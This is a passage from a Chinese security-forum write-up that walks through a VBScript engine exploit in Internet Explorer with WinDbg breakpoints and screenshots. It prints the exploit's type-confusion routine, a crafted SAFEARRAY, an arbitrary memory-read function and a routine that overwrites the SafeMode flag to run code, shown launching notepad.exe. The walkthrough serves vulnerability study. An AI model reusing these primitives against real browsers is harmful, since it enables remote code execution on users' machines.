
`ab(0)=1.123456789012345678901234567890`，该值转换IEEE浮点数可通过[IEEE 754 Calculator](https://bbs.kanxue.com/elink@bd0K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6W2K9i4c8*7i4K6u0W2k6r3g2Q4x3V1k6A6k6h3g2W2i4K6u0r3)计算：

![](https://bbs.kanxue.com/upload/attach/202103/817966_SYQV9TTCZABWZEF.jpg)

如此一来，可通过`aa`数组访问`ab`数组元素（由`ab`起始位置偏移8字节）。`type1=&h2f66`判断是由于`GetVarType`函数返回前会将`vt`与`0xFFFFBFFF`作与运算：

![](https://bbs.kanxue.com/upload/attach/202103/817966_2TARCC5M2BC5JFV.jpg)

### 第二部分

| | |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22 | `myarray = chrw(01) & chrw(2176) & chrw(01) & chrw(00) & chrw(00) & chrw(00) & chrw(00) & chrw(00)`<br>`myarray = myarray & chrw(00) & chrw(32767) & chrw(00) & chrw(0)`<br>`.......`<br>`sub testaa()`<br>`end sub`<br>`function mydata()`<br>`On Error Resume Next`<br>`i = testaa`<br>`i = null`<br>`redim Preserve aa(a2)`<br>`ab(0) = 0`<br>`aa(a1) = i`<br>`ab(0) = 6.36598737437801E-314`<br>`aa(a1+2) = myarray`<br>`ab(2) = 1.74088534731324E-310`<br>`mydata = aa(a1)`<br>`redim Preserve aa(a0)`<br>`end function` |

先来看`i = testaa`操作——将函数赋值给变量。简化版如下：

| | |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17 | `<!doctype html>`<br>`<html lang="en">`<br>`<head>`<br>`</head>`<br>`<body>`<br>`<script LANGUAGE="VBScript">`<br>`On Error Resume Next`<br>`sub testaa()`<br>`end sub`<br>`IsEmpty("Test")`<br>`i = testaa`<br>`i = null`<br>`</script>`<br>`</body>`<br>`</html>` |

于`vbscript!VbsIsEmpty`断下：

![](https://bbs.kanxue.com/upload/attach/202103/817966_HT8P6H2FYVRBG9B.jpg)

通过`ba w 2 1dc9e68`与`ba w 4 1dc9e68+8`两条指令对栈顶设断，第二次断下时，修改`vt`为`0x4C`：

![](https://bbs.kanxue.com/upload/attach/202103/817966_VBJVQS36X67GFWY.jpg)

第三次断下：

![](https://bbs.kanxue.com/upload/attach/202103/817966_KZMPEEUS66DMN3Q.jpg)

第四次断下，更改`vt`为`0x01`（`VT_NULL = 0x0001`）：

![](https://bbs.kanxue.com/upload/attach/202103/817966_SRRH4M8KJBBVDWG.jpg)

但其仍存储的是`vbscript!CScriptEntryPoint`对象，其后赋值给`i`。`On Error Resume Next`在此处尤为重要，是否加入该语句执行情况对比：

![](https://bbs.kanxue.com/upload/attach/202103/817966_S8BW4U825A4ANGH.jpg)

未加入`On Error Resume Next`语句最终会调用`CSession::ReportError`：

![](https://bbs.kanxue.com/upload/attach/202103/817966_KHQ2Q9E3SPZZTZJ.jpg)

而不会执行后续`i = null`语句，感兴趣的读者可自行探索`CScriptRuntime::RunNoEH`函数，不在这里过多展开（该函数功能复杂，笔者仅是简单跟踪是否加入`On Error Resume Next`语句的执行流）：

![](https://bbs.kanxue.com/upload/attach/202103/817966_4QB4S2SRHHW8QNW.jpg)

开启任意读写后执行`aa(a1) = i`：

![](https://bbs.kanxue.com/upload/attach/202103/817966_Z4VV4YD9R4UR9JZ.jpg)

`ab(0) = 6.36598737437801E-314`：

![](https://bbs.kanxue.com/upload/attach/202103/817966_RW5MPQVRZPXGE5Q.jpg)

`aa(a1+2) = myarray`：

![](https://bbs.kanxue.com/upload/attach/202103/817966_A4893XKUGT6Q7JE.jpg)

`ab(2) = 1.74088534731324E-310`：

![](https://bbs.kanxue.com/upload/attach/202103/817966_W92FZZCYTC3MP5F.jpg)

关于此处的调试可于`vbscript!VbsIsEmpty`函数设断，配合如下修改：

| | |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12 | `'isempty(ab)`<br>`ab(0) = 0`<br>`aa(a1) = i`<br>`'isempty("1")`<br>`ab(0) = 6.36598737437801E-314`<br>`'isempty("2")`<br>`aa(a1+2) = myarray`<br>`'isempty("3")`<br>`ab(2) = 1.74088534731324E-310`<br>`'isempty("4")` |

第一次断下后，可获得数组元素存储位置：

![](https://bbs.kanxue.com/upload/attach/202103/817966_YM3A2X6GAQG67JS.jpg)

`mydata = aa(a1)`：

![](https://bbs.kanxue.com/upload/attach/202103/817966_Z4FKBKYT8VCUF4A.jpg)

### 第三部分

| | |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13 | `function ReadMemo(add)`<br>`On Error Resume Next`<br>`redim Preserve aa(a2)`<br>`ab(0) = 0`<br>`aa(a1) = add + 4`<br>`ab(0) = 1.69759663316747E-313`<br>`ReadMemo = lenb(aa(a1))`<br>`ab(0) = 0`<br>`redim Preserve aa(a0)`<br>`end function` |

该函数功能用于读取参数`add`指向内存，关键函数是`cbLengthBstr`（具体请参考[VBScript Scripting Engine初探——0x05 LenB函数](https://bbs.pediy.com/thread-266286.htm#msg_header_h2_4)一节）。`ab(0) = 1.69759663316747E-313`：

![](https://bbs.kanxue.com/upload/attach/202103/817966_RF2XD2M8KXJZ2AU.jpg)

完成读取：

![](https://bbs.kanxue.com/upload/attach/202103/817966_99FT9QYZB4B7AAV.jpg)

### 第四部分

| | |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24 | `function setnotsafemode()`<br>`On Error Resume Next`<br>`i = mydata()`<br>`i = readmemo(i + 8)`<br>`i = readmemo(i + 16)`<br>`j = readmemo(i + &h134)`<br>`for k = 0 to &h60 step 4`<br>`j = readmemo(i + &h120 + k)`<br>`if (j = 14) then`<br>`j = 0`<br>`redim Preserve aa(a2)`<br>`aa(a1 + 2)(i + &h11c + k) = ab(4)`<br>`redim Preserve aa(a0)`<br>`j = 0`<br>`j = readmemo(i + &h120 + k)`<br>`Exit for`<br>`end if`<br>`next`<br>`ab(2) = 1.69759663316747E-313`<br>`runmumaa()`<br>`end function` |

第一次读取结果见上文图片，`i = readmemo(i + 16)`第二次读取：

![](https://bbs.kanxue.com/upload/attach/202103/817966_HNZY9FX3454KJZT.jpg)

该地址为`vbscript!COleScript`对象：

![](https://bbs.kanxue.com/upload/attach/202103/817966_4PME29ZVE2KJZGD.jpg)

通过循环于该对象偏移`0x120`之后搜寻`0x0E`，该值用于检查是否处于SafeMode：

![](https://bbs.kanxue.com/upload/attach/202103/817966_CHY8B634PDKRWNZ.jpg)

`aa(a1 + 2)`存储的是之前构造数组对象——`myarray`：

![](https://bbs.kanxue.com/upload/attach/202103/817966_RRJDJMWCABYNPWV.jpg)

`myarray`起始地址为0，`rgsabound.cElements`为`0x7fff0000`，故可读写`vbscript!COleScript + 0x170`处内容：

![](https://bbs.kanxue.com/upload/attach/202103/817966_H6HY2MMJG654GZ5.jpg)

修改完成，进入GodMode，成功弹出notepad.exe。

## 0x03 参阅链接

- [Microsoft Docs——SAFEARRAY](https://bbs.kanxue.com/elink@26bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3V1k6%4K9h3^5K6x3W2)9J5c8X3q4H3K9g2)9J5c8X3!0S2K9h3c8D9i4K6u0r3L8Y4y4Q4x3X3c8G2j5h3W2V1L8q4)9J5k6s2y4S2k6X3g2S2M7Y4u0S2P5b7`.`.)
- [VBScript Scripting Engine初探](https://bbs.pediy.com/thread-266286.htm)

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
